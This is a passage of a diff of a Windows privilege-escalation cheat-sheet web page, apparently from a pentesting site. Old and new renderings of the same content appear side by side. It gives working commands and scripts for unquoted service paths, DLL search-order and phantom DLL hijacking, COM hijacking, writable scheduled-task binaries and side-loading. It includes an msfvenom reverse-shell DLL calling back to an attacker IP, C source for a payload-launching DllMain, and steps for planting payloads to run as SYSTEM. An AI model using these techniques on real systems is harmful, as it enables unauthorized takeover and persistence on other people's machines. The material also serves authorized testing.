-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">h</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">r</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">l</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">WinExec</span><span class="p">(</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">sh.exe&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Drop it at the hijack location:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">copy</span> hijack.dll C:\Apps\foo.dll
-</span></span><span class="line"><span class="cl">## Restart the service:
-</span></span><span class="line"><span class="cl">sc.exe stop vulnsvc <span class="p">&amp;</span> sc.exe start vulnsvc
-</span></span></code></pre></div><h2 id="v-phantom-dll-missing-but-searched" data-heading-permalink="true"><span class="heading-content">v. Phantom DLL (missing but searched)</span>
-    <a class="heading-permalink" href="#v-phantom-dll-missing-but-searched" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>A common variant: the EXE references a DLL that does not exist on this system. Windows searches every location, fails, and may keep working without it. If you drop a DLL with that exact name in an earlier-searched path, it loads as SYSTEM.</p>
-<p>Find phantom DLLs with procmon on a test box, filter for <code>NAME NOT FOUND</code> and <code>Path ends with .dll</code>. Common phantom victims:</p>
-<ul>
-<li><code>wlbsctrl.dll</code> (IKEEXT service, when not in use)</li>
-<li><code>WptsExtensions.dll</code> (Task Scheduler)</li>
-<li><code>TSMSISrv.dll</code>, <code>TSVIPSrv.dll</code> (RDP)</li>
-<li><code>RasMxs.dll</code>, <code>RasMxsAuth.dll</code></li>
-</ul>
-<p>Drop your payload as one of these in <code>C:\Windows\System32\</code> (need write) or in a <code>PATH</code> entry that comes before System32.</p>
-<h2 id="vi-path-directory-writable" data-heading-permalink="true"><span class="heading-content">vi. PATH directory writable</span>
-    <a class="heading-permalink" href="#vi-path-directory-writable" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>If a directory in <code>PATH</code> is writable and listed before System32, you can shadow legitimate binaries:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$env:PATH</span> <span class="n">-split</span> <span class="s1">&#39;;&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Any writable entry before C:\Windows\System32 is exploitable</span>
-</span></span></code></pre></div><p>Drop a malicious <code>cmd.exe</code> (or <code>net.exe</code>, <code>ping.exe</code>) there. When SYSTEM (a scheduled task, a service, an admin running a script) calls that command, your version runs.</p>
-<h2 id="vii-com-hijacking" data-heading-permalink="true"><span class="heading-content">vii. COM hijacking</span>
-    <a class="heading-permalink" href="#vii-com-hijacking" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Hijack a CLSID&rsquo;s InprocServer32 to point to your DLL. When a privileged process activates that COM object, your DLL loads. Survives reboot too.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32&#34;</span>
-</span></span><span class="line"><span class="cl">## If writable in HKCU and the target process checks HKCU first (UAC scope), plant your DLL path
-</span></span></code></pre></div><p>Less common as a privesc on its own but useful for persistence after privesc.</p>
-<h2 id="viii-scheduled-task-binary" data-heading-permalink="true"><span class="heading-content">viii. Scheduled task binary</span>
-    <a class="heading-permalink" href="#viii-scheduled-task-binary" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Same surface as services. A scheduled task running as SYSTEM with a writable binary path:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nv">$p</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Principal</span><span class="p">.</span><span class="py">UserId</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">-match</span> <span class="s1">&#39;SYSTEM&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nv">$_</span><span class="p">.</span><span class="py">Actions</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nv">$exe</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Execute</span> <span class="o">-replace</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">      <span class="nv">$args</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Arguments</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$exe</span> <span class="o">-and</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$exe</span><span class="p">))</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="nv">$exe</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="py">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">IdentityReference</span> <span class="o">-match</span> <span class="nv">$env:USERNAME</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write&#39;</span><span class="p">})</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="s2">&#34;WRITABLE TASK BIN: </span><span class="p">$(</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskName</span><span class="p">)</span><span class="s2"> -&gt; </span><span class="nv">$exe</span><span class="s2"> </span><span class="nv">$args</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>If writable, overwrite the binary, wait for the task to fire (or force it with <code>schtasks /run /tn &lt;name&gt;</code>).</p>
-<h2 id="ix-side-loading-common-signed-binaries" data-heading-permalink="true"><span class="heading-content">ix. Side-loading common signed binaries</span>
-    <a class="heading-permalink" href="#ix-side-loading-common-signed-binaries" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Some signed Microsoft binaries (legitimately) load DLLs from their own directory. If you can write to that directory, plant a DLL to side-load with the binary&rsquo;s signature reputation:</p>
-<ul>
-<li><code>OneDriveSetup.exe</code> -&gt; <code>version.dll</code></li>
-<li><code>Teams.exe</code> -&gt; <code>cryptbase.dll</code></li>
-<li>Various Microsoft tools have known side-loadable DLLs</li>
-</ul>
-<p>This is more a defense-evasion technique (signed parent process = looks legitimate) than a direct privesc, but useful when combined with the above.</p>
-<h2 id="x-cleanup" data-heading-permalink="true"><span class="heading-content">x. Cleanup</span>
-    <a class="heading-permalink" href="#x-cleanup" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## Remove planted DLLs and EXEs
-</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="s2">&#34;C:\Program Files\Common.exe&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">del</span> C:\Apps\foo.dll
-</span></span><span class="line"><span class="cl">## Restore original service state if you stopped/started
-</span></span><span class="line"><span class="cl">sc.exe start vulnsvc
-</span></span></code></pre></div><p>See <a href="https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/">Persistence &amp; Cleanup</a>
- for the full Windows cleanup pass.</p>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/windows/w04-privesc---services--registry/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">PrivEsc - Services &amp; Registry</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/windows/w06-privesc---credentials--files/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">PrivEsc - Credentials &amp; Files</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><p>If you can write to any of those prefixes, drop your payload there.</p><p>Find them:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>wmic service get name,displayname,pathname,startmode <span class=p>|</span> findstr /i <span class=s2>&#34;auto&#34;</span> <span class=p>|</span> findstr /i /v <span class=s2>&#34;c:\windows\\&#34;</span> <span class=p>|</span> findstr /i /v <span class=s2>&#34;&#34;&#34;</span>
+</span></span></code></pre></div><p>PowerShell version:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>Win32_Service</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$_</span><span class=p>.</span><span class=py>PathName</span> <span class=o>-match</span> <span class=s1>&#39; &#39;</span> <span class=o>-and</span> <span class=nv>$_</span><span class=p>.</span><span class=py>PathName</span> <span class=o>-notmatch</span> <span class=s1>&#39;^&#34;&#39;</span> <span class=o>-and</span> <span class=nv>$_</span><span class=p>.</span><span class=py>PathName</span> <span class=o>-notmatch</span> <span class=s1>&#39;^C:\\Windows&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=p>|</span> <span class=nb>Select-Object</span> <span class=n>Name</span><span class=p>,</span><span class=n>PathName</span><span class=p>,</span><span class=n>StartMode</span>
+</span></span></code></pre></div><p>Then test write access on each candidate prefix:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$path</span> <span class=p>=</span> <span class=s2>&#34;C:\Program Files\Common Files\My App\backup.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>$parts</span> <span class=p>=</span> <span class=nv>$path</span> <span class=n>-split</span> <span class=s1>&#39;\\&#39;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=p>=</span><span class=mf>1</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>-lt</span> <span class=nv>$parts</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span> <span class=nv>$i</span><span class=p>++)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$dir</span> <span class=p>=</span> <span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mf>0</span><span class=p>..(</span><span class=nv>$i</span><span class=p>-</span><span class=mf>1</span><span class=p>)]</span> <span class=n>-join</span> <span class=s1>&#39;\&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>Test-Path</span> <span class=nv>$dir</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$f</span> <span class=p>=</span> <span class=s2>&#34;</span><span class=nv>$dir</span><span class=s2>\writetest.tmp&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>[</span><span class=no>io.file</span><span class=p>]::</span><span class=n>OpenWrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>).</span><span class=py>Close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>      <span class=nb>Remove-Item</span> <span class=nv>$f</span>
+</span></span><span class=line><span class=cl>      <span class=nb>Write-Host</span> <span class=s2>&#34;WRITABLE: </span><span class=nv>$dir</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Exploit by dropping a payload at the writable prefix:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>copy</span> C:\Windows\Temp\sh.exe <span class=s2>&#34;C:\Program Files\Common.exe&#34;</span>
+</span></span><span class=line><span class=cl>sc.exe stop vulnsvc <span class=p>&amp;</span> sc.exe start vulnsvc
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>Need restart permission</span></div><div class=obsidian-callout-body><p>Unquoted path is useless if you can&rsquo;t restart the service. Check <code>sc.exe sdshow &lt;svc></code> for SERVICE_STOP rights, or wait for reboot.</p></div></div><h2 id=ii-dll-hijacking-the-search-order data-heading-permalink=true><span class=heading-content>ii. DLL hijacking, the search order</span>
+<a class=heading-permalink href=#ii-dll-hijacking-the-search-order aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When a binary calls <code>LoadLibrary("foo.dll")</code> without an absolute path, Windows searches in order:</p><ol><li>The directory the EXE is in</li><li>The current directory (CWD)</li><li><code>C:\Windows\System32</code></li><li><code>C:\Windows\System</code></li><li><code>C:\Windows</code></li><li>Directories in <code>PATH</code></li></ol><p>Plant <code>foo.dll</code> in any earlier-searched writable directory.</p><p><code>SafeDllSearchMode</code> (default on since XP SP2) moves CWD lower in the order, but search 1 (EXE directory) always wins.</p><h2 id=iii-find-dll-hijack-candidates data-heading-permalink=true><span class=heading-content>iii. Find DLL hijack candidates</span>
+<a class=heading-permalink href=#iii-find-dll-hijack-candidates aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Run Process Monitor (procmon) on a test box, filter for <code>NAME NOT FOUND</code> and <code>Path ends with .dll</code>. Each missing DLL is a candidate. On the target, repeat with the actual service.</p><p>Quick script to find writable directories in PATH (planting a DLL named like a commonly-loaded one):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$env:PATH</span> <span class=n>-split</span> <span class=s1>&#39;;&#39;</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nb>Test-Path</span> <span class=nv>$_</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$f</span> <span class=p>=</span> <span class=s2>&#34;</span><span class=nv>$_</span><span class=s2>\writetest.tmp&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>[</span><span class=no>io.file</span><span class=p>]::</span><span class=n>OpenWrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>).</span><span class=py>Close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>      <span class=nb>Remove-Item</span> <span class=nv>$f</span>
+</span></span><span class=line><span class=cl>      <span class=nb>Write-Host</span> <span class=s2>&#34;WRITABLE PATH dir: </span><span class=nv>$_</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><h2 id=iv-build-a-hijack-dll data-heading-permalink=true><span class=heading-content>iv. Build a hijack DLL</span>
+<a class=heading-permalink href=#iv-build-a-hijack-dll aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Generate one with msfvenom:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msfvenom -p windows/x64/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>10.10.14.1 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4444</span> -f dll -o hijack.dll
+</span></span></code></pre></div><p>Or a minimal C source if AV chews on msfvenom:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// hijack.c, build with: x86_64-w64-mingw32-gcc hijack.c -shared -o hijack.dll
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=n>BOOL</span> <span class=n>WINAPI</span> <span class=nf>DllMain</span><span class=p>(</span><span class=n>HINSTANCE</span> <span class=n>h</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>r</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>l</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=n>DLL_PROCESS_ATTACH</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>WinExec</span><span class=p>(</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>Temp</span><span class=se>\\</span><span class=s>sh.exe&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>Drop it at the hijack location:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>copy</span> hijack.dll C:\Apps\foo.dll
+</span></span><span class=line><span class=cl>## Restart the service:
+</span></span><span class=line><span class=cl>sc.exe stop vulnsvc <span class=p>&amp;</span> sc.exe start vulnsvc
+</span></span></code></pre></div><h2 id=v-phantom-dll-missing-but-searched data-heading-permalink=true><span class=heading-content>v. Phantom DLL (missing but searched)</span>
+<a class=heading-permalink href=#v-phantom-dll-missing-but-searched aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>A common variant: the EXE references a DLL that does not exist on this system. Windows searches every location, fails, and may keep working without it. If you drop a DLL with that exact name in an earlier-searched path, it loads as SYSTEM.</p><p>Find phantom DLLs with procmon on a test box, filter for <code>NAME NOT FOUND</code> and <code>Path ends with .dll</code>. Common phantom victims:</p><ul><li><code>wlbsctrl.dll</code> (IKEEXT service, when not in use)</li><li><code>WptsExtensions.dll</code> (Task Scheduler)</li><li><code>TSMSISrv.dll</code>, <code>TSVIPSrv.dll</code> (RDP)</li><li><code>RasMxs.dll</code>, <code>RasMxsAuth.dll</code></li></ul><p>Drop your payload as one of these in <code>C:\Windows\System32\</code> (need write) or in a <code>PATH</code> entry that comes before System32.</p><h2 id=vi-path-directory-writable data-heading-permalink=true><span class=heading-content>vi. PATH directory writable</span>
+<a class=heading-permalink href=#vi-path-directory-writable aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>If a directory in <code>PATH</code> is writable and listed before System32, you can shadow legitimate binaries:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$env:PATH</span> <span class=n>-split</span> <span class=s1>&#39;;&#39;</span>
+</span></span><span class=line><span class=cl><span class=c>## Any writable entry before C:\Windows\System32 is exploitable</span>
+</span></span></code></pre></div><p>Drop a malicious <code>cmd.exe</code> (or <code>net.exe</code>, <code>ping.exe</code>) there. When SYSTEM (a scheduled task, a service, an admin running a script) calls that command, your version runs.</p><h2 id=vii-com-hijacking data-heading-permalink=true><span class=heading-content>vii. COM hijacking</span>
+<a class=heading-permalink href=#vii-com-hijacking aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Hijack a CLSID&rsquo;s InprocServer32 to point to your DLL. When a privileged process activates that COM object, your DLL loads. Survives reboot too.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>reg query <span class=s2>&#34;HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InprocServer32&#34;</span>
+</span></span><span class=line><span class=cl>## If writable in HKCU and the target process checks HKCU first (UAC scope), plant your DLL path
+</span></span></code></pre></div><p>Less common as a privesc on its own but useful for persistence after privesc.</p><h2 id=viii-scheduled-task-binary data-heading-permalink=true><span class=heading-content>viii. Scheduled task binary</span>
+<a class=heading-permalink href=#viii-scheduled-task-binary aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Same surface as services. A scheduled task running as SYSTEM with a writable binary path:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-ScheduledTask</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$p</span> <span class=p>=</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Principal</span><span class=p>.</span><span class=py>UserId</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nv>$p</span> <span class=o>-match</span> <span class=s1>&#39;SYSTEM&#39;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_</span><span class=p>.</span><span class=py>Actions</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$exe</span> <span class=p>=</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Execute</span> <span class=o>-replace</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>      <span class=nv>$args</span> <span class=p>=</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Arguments</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nv>$exe</span> <span class=o>-and</span> <span class=p>(</span><span class=nb>Test-Path</span> <span class=nv>$exe</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=p>=</span> <span class=nb>Get-Acl</span> <span class=nv>$exe</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$a</span><span class=p>.</span><span class=py>Access</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-match</span> <span class=nv>$env:USERNAME</span> <span class=o>-and</span> <span class=nv>$_</span><span class=p>.</span><span class=py>FileSystemRights</span> <span class=o>-match</span> <span class=s1>&#39;Write&#39;</span><span class=p>})</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;WRITABLE TASK BIN: </span><span class=p>$(</span><span class=nv>$_</span><span class=p>.</span><span class=n>TaskName</span><span class=p>)</span><span class=s2> -&gt; </span><span class=nv>$exe</span><span class=s2> </span><span class=nv>$args</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>If writable, overwrite the binary, wait for the task to fire (or force it with <code>schtasks /run /tn &lt;name></code>).</p><h2 id=ix-side-loading-common-signed-binaries data-heading-permalink=true><span class=heading-content>ix. Side-loading common signed binaries</span>
+<a class=heading-permalink href=#ix-side-loading-common-signed-binaries aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Some signed Microsoft binaries (legitimately) load DLLs from their own directory. If you can write to that directory, plant a DLL to side-load with the binary&rsquo;s signature reputation:</p><ul><li><code>OneDriveSetup.exe</code> -> <code>version.dll</code></li><li><code>Teams.exe</code> -> <code>cryptbase.dll</code></li><li>Various Microsoft tools have known side-loadable DLLs</li></ul><p>This is more a defense-evasion technique (signed parent process = looks legitimate) than a direct privesc, but useful when combined with the above.</p><h2 id=x-cleanup data-heading-permalink=true><span class=heading-content>x. Cleanup</span>
+<a class=heading-permalink href=#x-cleanup aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>## Remove planted DLLs and EXEs
+</span></span><span class=line><span class=cl><span class=k>del</span> <span class=s2>&#34;C:\Program Files\Common.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>del</span> C:\Apps\foo.dll
+</span></span><span class=line><span class=cl>## Restore original service state if you stopped/started
+</span></span><span class=line><span class=cl>sc.exe start vulnsvc
+</span></span></code></pre></div><p>See <a href=https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/>Persistence & Cleanup</a>
+for the full Windows cleanup pass.</p></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/windows/w04-privesc---services--registry/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>PrivEsc - Services & Registry</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/windows/w06-privesc---credentials--files/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>PrivEsc - Credentials & Files</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
